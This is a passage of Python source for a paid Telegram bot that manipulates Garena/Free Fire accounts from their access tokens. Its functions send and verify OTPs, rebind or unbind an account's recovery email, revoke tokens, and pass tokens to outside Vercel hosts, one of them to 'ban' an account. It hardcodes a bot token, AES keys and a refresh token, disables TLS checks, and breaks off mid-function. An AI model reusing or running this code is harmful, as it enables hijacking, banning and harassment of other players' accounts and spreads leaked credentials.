#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
R32 SHADOW – Premium Garena Account Management Bot
Developer: @r32pro
Co-Developer: ILYASS @XHR_M
Channel: https://t.me/ShadowCodee
Version: 5.2 – ALL-IN-ONE WITH ADMIN CONTROLS & BUG FIXES
"""

import json
import os
import random
import string
import hashlib
import urllib.parse
import logging
import sys
import time
import re
import asyncio
from datetime import datetime, timedelta
from typing import Dict, Optional, List, Any, Tuple

# ============================================================
# DNS PATCH – لحل مشكلة NameResolutionError في الاستضافة
# ============================================================
# ============================================================
# DNS PATCH – لحل مشكلة الحظر و الـ Timeout فـ الاستضافة
# ============================================================
import socket

# IPs حقيقيين وثابتين ديال سيرفرات Garena (بلا ما نحتاجو DNS)
GARENA_IPS = {
    "100067.connect.garena.com": "203.117.151.144",
    "api-otrss.garena.com": "203.117.151.135"
}

original_getaddrinfo = socket.getaddrinfo
def patched_getaddrinfo(host, port, family=0, type=0, proto=0, flags=0):
    if host in GARENA_IPS:
        ip = GARENA_IPS[host]
        # كيدوز الاتصال للـ IP نيشان بلا ما يضرب دورة ف الـ DNS
        return [(socket.AF_INET, socket.SOCK_STREAM, 6, '', (ip, port))]
    return original_getaddrinfo(host, port, family, type, proto, flags)

socket.getaddrinfo = patched_getaddrinfo
# ============================================================


import requests
import urllib3
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    filters,
    ContextTypes,
)

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = "8977729299:AAGmRUMkQhrRhHgkGEwMPOC1rwSZzcncIww"
OWNER_ID = 7943260217
KEY_PREFIX = "R32-KEY"
MAX_DEVICES_DEFAULT = 5

KEYS_FILE = "keys.json"
USERS_FILE = "users.json"
SPAM_FILE = "spam_requests.json"
BOT_STATUS_FILE = "bot_status.json"

# Language codes
LANG_EN = "en"
LANG_AR = "ar"

# ============================================================
# LOGGING - SILENT MODE
# ============================================================

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.ERROR
)
logger = logging.getLogger(__name__)

# Disable httpx logging
logging.getLogger("httpx").setLevel(logging.WARNING)
logging.getLogger("httpcore").setLevel(logging.WARNING)
logging.getLogger("telegram").setLevel(logging.WARNING)

# ============================================================
# BRANDING FOOTER
# ============================================================

FOOTER_EN = (
    "\n\n---\n"
    "👨‍💻 **Developer:** R32 SHADOW\n"
    "👨‍💻 **Co-Developer:** ILYASS @XHR_M\n"
    "📱 **Telegram:** @r32pro\n"
    "📢 **Channel:** https://t.me/ShadowCodee"
)

FOOTER_AR = (
    "\n\n---\n"
    "👨‍💻 **المطور:** R32 SHADOW\n"
    "👨‍💻 **المطور المساعد:** ILYASS @XHR_M\n"
    "📱 **تيليجرام:** @r32pro\n"
    "📢 **القناة:** https://t.me/ShadowCodee"
)

def get_footer(lang: str = LANG_EN) -> str:
    return FOOTER_AR if lang == LANG_AR else FOOTER_EN

def add_footer(text: str, lang: str = LANG_EN) -> str:
    return text + get_footer(lang)

# ============================================================
# MARKDOWN HELPER
# ============================================================

def escape_markdown(text: str) -> str:
    special_chars = r'_*[]()~`>#+-=|{}.!'
    for char in special_chars:
        text = text.replace(char, f'\\{char}')
    return text

def safe_markdown(text: str) -> str:
    parts = re.split(r'(`[^`]+`)', text)
    result = []
    for part in parts:
        if part.startswith('`') and part.endswith('`'):
            result.append(part)
        else:
            result.append(escape_markdown(part))
    return ''.join(result)

async def safe_reply_text(update: Update, text: str, parse_mode: str = "MarkdownV2", **kwargs):
    """Send a message safely, works for both message and callback query."""
    try:
        if update.message:
            return await update.message.reply_text(
                text=safe_markdown(text),
                parse_mode=parse_mode,
                **kwargs
            )
        elif update.callback_query and update.callback_query.message:
            return await update.callback_query.message.reply_text(
                text=safe_markdown(text),
                parse_mode=parse_mode,
                **kwargs
            )
        else:
            # Fallback: try to send via bot using effective chat
            chat_id = update.effective_chat.id if update.effective_chat else None
            if chat_id:
                return await update.get_bot().send_message(
                    chat_id=chat_id,
                    text=safe_markdown(text),
                    parse_mode=parse_mode,
                    **kwargs
                )
            else:
                logger.error("Cannot send message: no chat_id available")
                return None
    except Exception as e:
        logger.error(f"Markdown error: {e}")
        plain_text = re.sub(r'[`*_~#]', '', text)
        try:
            if update.message:
                return await update.message.reply_text(
                    text=plain_text,
                    parse_mode=None,
                    **kwargs
                )
            elif update.callback_query and update.callback_query.message:
                return await update.callback_query.message.reply_text(
                    text=plain_text,
                    parse_mode=None,
                    **kwargs
                )
            else:
                chat_id = update.effective_chat.id if update.effective_chat else None
                if chat_id:
                    return await update.get_bot().send_message(
                        chat_id=chat_id,
                        text=plain_text,
                        parse_mode=None,
                        **kwargs
                    )
                else:
                    return None
        except Exception as e2:
            logger.error(f"Fallback send error: {e2}")
            return None

# ============================================================
# BOT STATUS MANAGER
# ============================================================

class BotStatusManager:
    @staticmethod
    def load_status() -> bool:
        try:
            if os.path.exists(BOT_STATUS_FILE):
                with open(BOT_STATUS_FILE, 'r') as f:
                    data = json.load(f)
                    return data.get("running", True)
            return True
        except:
            return True
    
    @staticmethod
    def save_status(running: bool) -> bool:
        try:
            with open(BOT_STATUS_FILE, 'w') as f:
                json.dump({"running": running, "updated_at": datetime.now().isoformat()}, f, indent=4)
            return True
        except:
            return False
    
    @staticmethod
    def is_running() -> bool:
        return BotStatusManager.load_status()

# ============================================================
# DATA MANAGER
# ============================================================

class DataManager:
    @staticmethod
    def load(filename: str, default: Any = None) -> Any:
        try:
            if os.path.exists(filename):
                with open(filename, 'r') as f:
                    return json.load(f)
            return default or {}
        except Exception as e:
            logger.error(f"Load error {filename}: {e}")
            return default or {}
    
    @staticmethod
    def save(filename: str, data: Any) -> bool:
        try:
            with open(filename, 'w') as f:
                json.dump(data, f, indent=4)
            return True
        except Exception as e:
            logger.error(f"Save error {filename}: {e}")
            return False
    
    @classmethod
    def get_keys(cls) -> Dict:
        return cls.load(KEYS_FILE, {})
    
    @classmethod
    def save_keys(cls, keys: Dict) -> bool:
        return cls.save(KEYS_FILE, keys)
    
    @classmethod
    def get_users(cls) -> Dict:
        return cls.load(USERS_FILE, {})
    
    @classmethod
    def save_users(cls, users: Dict) -> bool:
        return cls.save(USERS_FILE, users)
    
    @classmethod
    def get_spam_requests(cls) -> Dict:
        return cls.load(SPAM_FILE, {"requests": [], "active": {}})
    
    @classmethod
    def save_spam_requests(cls, data: Dict) -> bool:
        return cls.save(SPAM_FILE, data)
    
    @classmethod
    def ensure_user(cls, user_id: int, username: str = "", first_name: str = "") -> None:
        users = cls.get_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {
                "id": user_id,
                "username": username,
                "first_name": first_name,
                "joined_at": datetime.now().isoformat(),
                "keys": [],
                "token_history": [],
                "language": LANG_EN,
                "spam_active": False,
                "spam_pending": False,
                "is_admin": (user_id == OWNER_ID)
            }
        else:
            if username and username != users[uid].get("username"):
                users[uid]["username"] = username
            if first_name and first_name != users[uid].get("first_name"):
                users[uid]["first_name"] = first_name
            if "language" not in users[uid]:
                users[uid]["language"] = LANG_EN
            if "spam_active" not in users[uid]:
                users[uid]["spam_active"] = False
            if "spam_pending" not in users[uid]:
                users[uid]["spam_pending"] = False
            if "is_admin" not in users[uid]:
                users[uid]["is_admin"] = (user_id == OWNER_ID)
        cls.save_users(users)
    
    @classmethod
    def get_user_lang(cls, user_id: int) -> str:
        users = cls.get_users()
        uid = str(user_id)
        return users.get(uid, {}).get("language", LANG_EN)
    
    @classmethod
    def set_user_lang(cls, user_id: int, lang: str) -> bool:
        users = cls.get_users()
        uid = str(user_id)
        if uid in users:
            users[uid]["language"] = lang
            return cls.save_users(users)
        return False
    
    @classmethod
    def is_admin(cls, user_id: int) -> bool:
        users = cls.get_users()
        uid = str(user_id)
        return users.get(uid, {}).get("is_admin", False) or user_id == OWNER_ID
    
    @classmethod
    def add_token_history(cls, user_id: int, token: str, action: str) -> None:
        users = cls.get_users()
        uid = str(user_id)
        if uid in users:
            if "token_history" not in users[uid]:
                users[uid]["token_history"] = []
            users[uid]["token_history"].append({
                "token": token,
                "action": action,
                "timestamp": datetime.now().isoformat()
            })
            cls.save_users(users)

# ============================================================
# KEY MANAGER
# ============================================================

class KeyManager:
    @staticmethod
    def generate() -> str:
        suffix = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))
        return f"{KEY_PREFIX}{suffix}"
    
    @staticmethod
    def create(duration: int, unit: str, max_devices: int, owner: int) -> Dict:
        now = datetime.now()
        if unit == "days":
            expires = now + timedelta(days=duration)
        else:
            expires = now + timedelta(hours=duration)
        return {
            "key": KeyManager.generate(),
            "created_at": now.isoformat(),
            "expires_at": expires.isoformat(),
            "max_devices": max_devices,
            "users": [],
            "owner": owner,
            "active": True
        }
    
    @staticmethod
    def save(key_data: Dict) -> bool:
        keys = DataManager.get_keys()
        keys[key_data["key"]] = key_data
        return DataManager.save_keys(keys)
    
    @staticmethod
    def get(key: str) -> Optional[Dict]:
        return DataManager.get_keys().get(key)
    
    @staticmethod
    def get_all() -> Dict:
        return DataManager.get_keys()
    
    @staticmethod
    def disable(key: str) -> bool:
        keys = DataManager.get_keys()
        if key in keys:
            keys[key]["active"] = False
            return DataManager.save_keys(keys)
        return False
    
    @staticmethod
    def add_user(key: str, user_id: int) -> bool:
        keys = DataManager.get_keys()
        if key not in keys:
            return False
        data = keys[key]
        if not data.get("active", True):
            return False
        try:
            if datetime.fromisoformat(data["expires_at"]) < datetime.now():
                data["active"] = False
                DataManager.save_keys(keys)
                return False
        except:
            pass
        if user_id in data.get("users", []):
            return True
        if len(data.get("users", [])) >= data.get("max_devices", MAX_DEVICES_DEFAULT):
            return False
        data["users"].append(user_id)
        users = DataManager.get_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {"keys": []}
        if key not in users[uid]["keys"]:
            users[uid]["keys"].append(key)
        DataManager.save_users(users)
        return DataManager.save_keys(keys)
    
    @staticmethod
    def remove_user(key: str, user_id: int) -> bool:
        keys = DataManager.get_keys()
        if key not in keys:
            return False
        if user_id not in keys[key].get("users", []):
            return False
        keys[key]["users"] = [u for u in keys[key]["users"] if u != user_id]
        users = DataManager.get_users()
        uid = str(user_id)
        if uid in users:
            users[uid]["keys"] = [k for k in users[uid]["keys"] if k != key]
        DataManager.save_users(users)
        return DataManager.save_keys(keys)
    
    @staticmethod
    def get_users(key: str) -> List[int]:
        data = KeyManager.get(key)
        return data.get("users", []) if data else []
    
    @staticmethod
    def cleanup() -> int:
        keys = DataManager.get_keys()
        now = datetime.now()
        count = 0
        for k, v in keys.items():
            if v.get("active", True):
                try:
                    if datetime.fromisoformat(v["expires_at"]) < now:
                        v["active"] = False
                        count += 1
                except:
                    pass
        if count:
            DataManager.save_keys(keys)
        return count

# ============================================================
# SPAM MANAGER
# ============================================================

class SpamManager:
    @staticmethod
    def create_request(user_id: int, eat_token: str) -> Dict:
        request_id = ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
        return {
            "id": request_id,
            "user_id": user_id,
            "eat_token": eat_token,
            "status": "pending",
            "created_at": datetime.now().isoformat(),
            "approved_at": None
        }
    
    @staticmethod
    def save_request(request: Dict) -> bool:
        data = DataManager.get_spam_requests()
        data["requests"] = [r for r in data["requests"] if not (r["user_id"] == request["user_id"] and r["status"] == "pending")]
        data["requests"].append(request)
        users = DataManager.get_users()
        uid = str(request["user_id"])
        if uid in users:
            users[uid]["spam_pending"] = True
            DataManager.save_users(users)
        return DataManager.save_spam_requests(data)
    
    @staticmethod
    def get_pending_requests() -> List[Dict]:
        data = DataManager.get_spam_requests()
        return [r for r in data.get("requests", []) if r.get("status") == "pending"]
    
    @staticmethod
    def get_request(request_id: str) -> Optional[Dict]:
        data = DataManager.get_spam_requests()
        for r in data.get("requests", []):
            if r.get("id") == request_id:
                return r
        return None
    
    @staticmethod
    def get_user_pending_request(user_id: int) -> Optional[Dict]:
        data = DataManager.get_spam_requests()
        for r in data.get("requests", []):
            if r.get("user_id") == user_id and r.get("status") == "pending":
                return r
        return None
    
    @staticmethod
    def approve_request(request_id: str) -> bool:
        data = DataManager.get_spam_requests()
        for r in data.get("requests", []):
            if r.get("id") == request_id and r.get("status") == "pending":
                r["status"] = "approved"
                r["approved_at"] = datetime.now().isoformat()
                users = DataManager.get_users()
                uid = str(r["user_id"])
                if uid in users:
                    users[uid]["spam_active"] = True
                    users[uid]["spam_pending"] = False
                    DataManager.save_users(users)
                return DataManager.save_spam_requests(data)
        return False
    
    @staticmethod
    def reject_request(request_id: str) -> bool:
        data = DataManager.get_spam_requests()
        for r in data.get("requests", []):
            if r.get("id") == request_id and r.get("status") == "pending":
                r["status"] = "rejected"
                users = DataManager.get_users()
                uid = str(r["user_id"])
                if uid in users:
                    users[uid]["spam_pending"] = False
                    DataManager.save_users(users)
                return DataManager.save_spam_requests(data)
        return False
    
    @staticmethod
    def deactivate_spam(user_id: int) -> bool:
        users = DataManager.get_users()
        uid = str(user_id)
        if uid in users:
            users[uid]["spam_active"] = False
            return DataManager.save_users(users)
        return False
    
    @staticmethod
    def is_spam_active(user_id: int) -> bool:
        users = DataManager.get_users()
        uid = str(user_id)
        return users.get(uid, {}).get("spam_active", False)
    
    @staticmethod
    def has_pending_request(user_id: int) -> bool:
        users = DataManager.get_users()
        uid = str(user_id)
        return users.get(uid, {}).get("spam_pending", False)

# ============================================================
# KEY CHECK
# ============================================================

def check_user_key(user_id: int) -> bool:
    if DataManager.is_admin(user_id):
        return True
    keys = DataManager.get_keys()
    now = datetime.now()
    for key, data in keys.items():
        if not data.get("active", True):
            continue
        if user_id not in data.get("users", []):
            continue
        try:
            if datetime.fromisoformat(data["expires_at"]) > now:
                return True
            else:
                data["active"] = False
                DataManager.save_keys(keys)
        except:
            continue
    return False

def validate_key(key: str, user_id: int) -> Tuple[bool, str]:
    keys = DataManager.get_keys()
    if key not in keys:
        return False, "Invalid key"
    data = keys[key]
    if not data.get("active", True):
        return False, "Key disabled"
    try:
        if datetime.fromisoformat(data["expires_at"]) < datetime.now():
            data["active"] = False
            DataManager.save_keys(keys)
            return False, "Key expired"
    except:
        pass
    if len(data.get("users", [])) >= data.get("max_devices", 5):
        return False, "Device limit reached"
    if user_id not in data.get("users", []):
        data["users"].append(user_id)
        DataManager.save_keys(keys)
        users = DataManager.get_users()
        uid = str(user_id)
        if uid not in users:
            users[uid] = {"keys": []}
        if key not in users[uid]["keys"]:
            users[uid]["keys"].append(key)
        DataManager.save_users(users)
        return True, "Access granted!"
    return True, "Welcome back!"

# ============================================================
# GARENA API HELPERS
# ============================================================

try:
    import MajoRLogin_pb2 as mLpB
    import MajorLoginRes_pb2 as mLrPb
except ImportError:
    logger.error("Protobuf files missing! Login history will not work.")
    mLpB = None
    mLrPb = None

AeSkEy = b'Yg&tc%DEuh6%Zc^8'
AeSiV = b'6oyZDr22E3ychjM%'

def enc(d):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad
    return AES.new(AeSkEy, AES.MODE_CBC, AeSiV).encrypt(pad(d, 16))

def dec(d):
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import unpad
    return unpad(AES.new(AeSkEy, AES.MODE_CBC, AeSiV).decrypt(d), 16)

PLATFORM_MAP = {
    1: "Garena", 3: "Facebook", 4: "Guest", 5: "VK",
    6: "Huawei", 7: "Apple", 8: "Google", 10: "GameCenter",
    11: "X (Twitter)", 13: "Apple ID", 28: "Line", 35: "TikTok"
}

def convert_seconds(s: int) -> str:
    if s <= 0:
        return "0s"
    d, h = divmod(s, 86400)
    h, m = divmod(h, 3600)
    m, s = divmod(m, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m: parts.append(f"{m}m")
    if s: parts.append(f"{s}s")
    return " ".join(parts) if parts else "0s"

def format_response_text(text: str, title: str = "API") -> str:
    try:
        data = json.loads(text)
        rc = data.get("result")
        if rc == 0:
            return f"✅ {title}: SUCCESS"
        elif rc is not None:
            error = data.get("error", "Unknown error")
            return f"❌ {title}: FAILED (Code: {rc} | {error})"
        return f"ℹ️ {title}: Done"
    except:
        if '"result":0' in text.replace(" ", ""):
            return f"✅ {title}: SUCCESS"
        return f"❌ {title}: Failed"

def mask_email(email: str) -> str:
    if not email:
        return email
    parts = email.split('@')
    if len(parts) != 2:
        return email
    local, domain = parts
    if len(local) <= 2:
        return email
    masked = local[0] + '*' * (len(local) - 2) + local[-1]
    return f"{masked}@{domain}"

def get_player_info(token: str) -> Tuple[str, str, str, bool]:
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        r = session.get(
            f"https://api-otrss.garena.com/support/callback/?access_token={token}",
            timeout=10,
            allow_redirects=True,
            verify=False
        )
        qp = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)
        if 'access_token' in qp:
            return (
                qp.get('account_id', ['Unknown'])[0],
                urllib.parse.unquote(qp.get('nickname', ['Unknown'])[0]),
                qp.get('region', ['Unknown'])[0],
                True
            )
        return "Unknown", "Unknown", "Unknown", False
    except Exception as e:
        logger.debug(f"get_player_info error: {e}")
        return "Unknown", "Unknown", "Unknown", False

def get_bind_info(token: str) -> Tuple[str, str, str, int, bool]:
    try:
        r = requests.get(
            "https://100067.connect.garena.com/game/account_security/bind:get_bind_info",
            params={"app_id": "100067", "access_token": token},
            headers={"User-Agent": "GarenaMSDK/4.0.19P9"},
            timeout=15
        )
        if r.status_code == 200:
            data = r.json()
            email = data.get("email", "")
            pending = data.get("email_to_be", "")
            countdown = data.get("request_exec_countdown", 0)
            rc = data.get("result", -1)
            return email, pending, convert_seconds(countdown), rc, True
        return "", "", "", -1, False
    except Exception as e:
        logger.debug(f"get_bind_info error: {e}")
        return "", "", "", -1, False

def get_bind_info_raw(token: str) -> Tuple[Dict, bool]:
    try:
        r = requests.get(
            "https://100067.connect.garena.com/game/account_security/bind:get_bind_info",
            params={"app_id": "100067", "access_token": token},
            headers={"User-Agent": "GarenaMSDK/4.0.19P9"},
            timeout=15
        )
        if r.status_code == 200:
            return r.json(), True
        return {}, False
    except Exception as e:
        logger.debug(f"get_bind_info_raw error: {e}")
        return {}, False

def send_otp(email: str, token: str) -> Tuple[bool, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "email": email,
        "locale": "en_PK",
        "region": "PK",
        "app_id": "100067",
        "access_token": token
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:send_otp",
            headers=headers,
            data=data,
            timeout=15
        )
        return True, format_response_text(r.text, "Send OTP")
    except Exception as e:
        return False, f"❌ Error: {e}"

def verify_otp(email: str, token: str, otp: str) -> Tuple[bool, str, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "app_id": "100067",
        "access_token": token,
        "email": email,
        "otp": otp,
        "type": "1"
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:verify_otp",
            headers=headers,
            data=data,
            timeout=15
        )
        verifier = r.json().get("verifier_token", "")
        return True, format_response_text(r.text, "Verify OTP"), verifier
    except Exception as e:
        return False, f"❌ Error: {e}", ""

def create_bind_request(email: str, token: str, verifier: str, sec_code: str) -> Tuple[bool, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "email": email,
        "app_id": "100067",
        "access_token": token,
        "verifier_token": verifier,
        "secondary_password": sec_code
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:create_bind_request",
            headers=headers,
            data=data,
            timeout=15
        )
        return True, format_response_text(r.text, "Bind Request")
    except Exception as e:
        return False, f"❌ Error: {e}"

def verify_identity_otp(email: str, token: str, otp: str) -> Tuple[bool, str, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "email": email,
        "app_id": "100067",
        "access_token": token,
        "otp": otp
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
            headers=headers,
            data=data,
            timeout=15
        )
        identity = r.json().get("identity_token", "")
        return True, format_response_text(r.text, "Verify Identity"), identity
    except Exception as e:
        return False, f"❌ Error: {e}", ""

def verify_identity_sec(email: str, token: str, sec_code: str) -> Tuple[bool, str, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    hashed = hashlib.sha256(sec_code.encode('utf-8')).hexdigest()
    data = {
        "email": email,
        "app_id": "100067",
        "access_token": token,
        "secondary_password": hashed
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:verify_identity",
            headers=headers,
            data=data,
            timeout=15
        )
        identity = r.json().get("identity_token", "")
        return True, format_response_text(r.text, "Verify Identity"), identity
    except Exception as e:
        return False, f"❌ Error: {e}", ""

def create_unbind_request(token: str, identity: str) -> Tuple[bool, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "app_id": "100067",
        "access_token": token,
        "identity_token": identity
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:create_unbind_request",
            headers=headers,
            data=data,
            timeout=15
        )
        return True, format_response_text(r.text, "Unbind Request")
    except Exception as e:
        return False, f"❌ Error: {e}", ""

def create_rebind_request(token: str, identity: str, email: str, verifier: str) -> Tuple[bool, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "identity_token": identity,
        "email": email,
        "app_id": "100067",
        "verifier_token": verifier,
        "access_token": token
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:create_rebind_request",
            headers=headers,
            data=data,
            timeout=15
        )
        return True, format_response_text(r.text, "Rebind Request")
    except Exception as e:
        return False, f"❌ Error: {e}", ""

def cancel_bind_request(token: str) -> Tuple[bool, str]:
    headers = {
        "User-Agent": "GarenaMSDK/4.0.30",
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = {
        "app_id": "100067",
        "access_token": token
    }
    try:
        r = requests.post(
            "https://100067.connect.garena.com/game/account_security/bind:cancel_request",
            headers=headers,
            data=data,
            timeout=15
        )
        return True, format_response_text(r.text, "Cancel Request")
    except Exception as e:
        return False, f"❌ Error: {e}"

def eat_to_token(eat: str) -> Tuple[str, Dict]:
    token = None
    if "http" in eat or "?" in eat:
        qp = urllib.parse.parse_qs(urllib.parse.urlparse(eat).query)
        if 'eat' in qp:
            token = qp['eat'][0]
    else:
        token = eat.strip()
    if not token:
        return "❌ No EAT token found", {}
    try:
        session = requests.Session()
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        r = session.get(
            f"https://api-otrss.garena.com/support/callback/?access_token={token}",
            allow_redirects=True,
            timeout=10,
            verify=False
        )
        qp = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)
        if 'access_token' in qp:
            acc_token = qp['access_token'][0]
            nickname = urllib.parse.unquote(qp.get('nickname', ['Unknown'])[0])
            account_id = qp.get('account_id', ['Unknown'])[0]
            region = qp.get('region', ['Unknown'])[0]
            return "", {
                "access_token": acc_token,
                "nickname": nickname,
                "account_id": account_id,
                "region": region
            }
        return "❌ Token expired or invalid", {}
    except Exception as e:
        logger.debug(f"eat_to_token error: {e}")
        return f"❌ Error: {e}", {}

def do_revoke(token: str) -> Tuple[str, Dict]:
    valid = False
    nickname = account_id = region = "Unknown"
    try:
        r = requests.get(
            f"https://api-otrss.garena.com/support/callback/?access_token={token}",
            headers={"User-Agent": "Mozilla/5.0"},
            allow_redirects=True,
            timeout=15
        )
        qp = urllib.parse.parse_qs(urllib.parse.urlparse(r.url).query)
        if 'access_token' in qp:
            valid = True
            nickname = urllib.parse.unquote(qp.get('nickname', ['Unknown'])[0])
            account_id = qp.get('account_id', ['Unknown'])[0]
            region = qp.get('region', ['Unknown'])[0]
    except:
        pass
    if not valid:
        return "❌ Token invalid or expired", {}
    try:
        r = requests.get(
            f"https://100067.connect.garena.com/oauth/logout?access_token={token}"
            f"&refresh_token=1380dcb63ab3a077dc05bdf0b25ba4497c403a5b4eae96d7203010eafa6c83a8",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=15
        )
        if r.status_code == 200 and "error" not in r.text.lower():
            return "", {
                "nickname": nickname,
                "account_id": account_id,
                "region": region,
                "status": "revoked"
            }
        return "❌ Failed to revoke token", {}
    except Exception as e:
        return f"❌ Error: {e}", {}

def check_bound(token: str) -> Tuple[bool, str, List, List]:
    try:
        r = requests.get(
            "https://100067.connect.garena.com/bind/app/platform/info/get",
            params={"access_token": token},
            headers={"User-Agent": "GarenaMSDK/4.0.19P9"},
            timeout=10
        )
        if r.status_code != 200:
            return False, f"HTTP {r.status_code}", [], []
        data = r.json()
        bounded = data.get("bounded_accounts", [])
        available = data.get("available_platforms", [])
        return True, "", bounded, available
    except Exception as e:
        return False, f"Error: {e}", [], []

def access_to_jwt_api(token: str) -> Tuple[bool, str]:
    try:
        url = f"https://acesstojwt-sigma.vercel.app/token?access_token={token}"
        headers = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(url, headers=headers, timeout=15)
        if r.status_code == 200:
            raw = r.text.strip()
            try:
                data = json.loads(raw)
                if isinstance(data, dict) and "token" in data:
                    return True, data["token"]
            except:
                pass
            if raw.startswith("ey") and "." in raw:
                return True, raw
        return False, f"HTTP {r.status_code}"
    except Exception as e:
        return False, f"Error: {e}"

def ban_account_api(token: str) -> Tuple[bool, str]:
    try:
        url = f"https://toji-api-jwt.vercel.app/ban?token={token}"
        headers = {"User-Agent": "Mozilla/5.0"}
        r = requests.get(url, headers=headers, timeout=20)
        return r.status_code == 200, r.text
    except Exception as e:
        return False, f"Error: {e}"

def build_majorlogin(tok, open_id, p_type):
    if mLpB is None:
        return None
    m = mLpB.MajorLogin()
    m.event_time = str(datetime.now())[:-7]
    m.game_name = "free fire"
    m.platform_id = p_type
    m.client_version = "1.120.1"
    m.system_software = "Android OS 9 / API-28"
    m.system_hardware = "Handheld"
    m.telecom_operator = "Verizon"
    m.network_type = "WIFI"
    m.screen_width = 1920
    m.screen_height = 1080
    m.screen_dpi = "280"
    m.processor_details = "ARM64 FP ASIMD AES VMH | 2865 | 4"
    m.memory = 3003
    m.gpu_renderer = "Adreno (TM) 640"
    m.gpu_version = "OpenGL ES 3.1 v1.46"
    m.unique_device_id = "Google|34a7dcdf-a7d5-4cb6-8d7e-3b0e448a0c57"
    m.client_ip = "223.191.51.89"
    m.language = "en"
    m.open_id = open_id
    m.open_id_type = str(p_type)
    m.device_type = "Handheld"
    m.access_token = tok
    m.platform_sdk_id = 1
    m.client_using_version = "7428b253defc164018c604a1ebbfebdf"
    m.login_by = 3
    m.channel_type = 3
    m.cpu_type = 2
    m.cpu_architecture = "64"
    m.client_version_code = "2019118695"
    m.login_open_id_type = p_type
    m.origin_platform_type = str(p_type)
    m.primary_platform_type = str(p_type)
    return enc(m.SerializeToString())

def read_varint(data, offset):
    res = 0
    shift = 0
    while True:
        if offset >= len(data):
            break
        b = data[offset]
        offset += 1
        res |= (b & 0x7f) << shift
        if not (b & 0x80):
            break
        shift += 7
    return res, offset

def parse_record(data):
    rec = {}
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
            if f == 1:
                rec['ts'] = val
            elif f == 2:
                rec['ram'] = val
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]
            offset += length
            if f == 3:
                rec['dev'] = val.decode(errors='ignore')
            elif f == 4:
                rec['arch'] = val.decode(errors='ignore')
        else:
            break
    return rec

def parse_history_protobuf(data):
    records = []
    offset = 0
    while offset < len(data):
        tag, offset = read_varint(data, offset)
        wt, f = tag & 7, tag >> 3
        if wt == 0:
            val, offset = read_varint(data, offset)
        elif wt == 2:
            length, offset = read_varint(data, offset)
            val = data[offset:offset+length]
            offset += length
            if f == 1:
                records.append(parse_record(val))
        else:
            break
    return records

def get_login_history(token: str) -> Tuple[str, List[Dict]]:
    if mLpB is None or mLrPb is None:
        return "Protobuf libraries missing.", []
    jwt_token = None
    if token.startswith("ey") and "." in token:
        jwt_token = token
    else:
        oId = None
        try:
            r = requests.get(f"https://100067.connect.garena.com/oauth/token/inspect?token={token}",
                             headers={"User-Agent": "Mozilla/5.0"}, timeout=5)
            if r.status_code == 200:
                oId = r.json().get("open_id")
        except:
            pass
        if not oId:
            try:
                uid_headers = {"access-token": token, "user-agent": "Mozilla/5.0"}
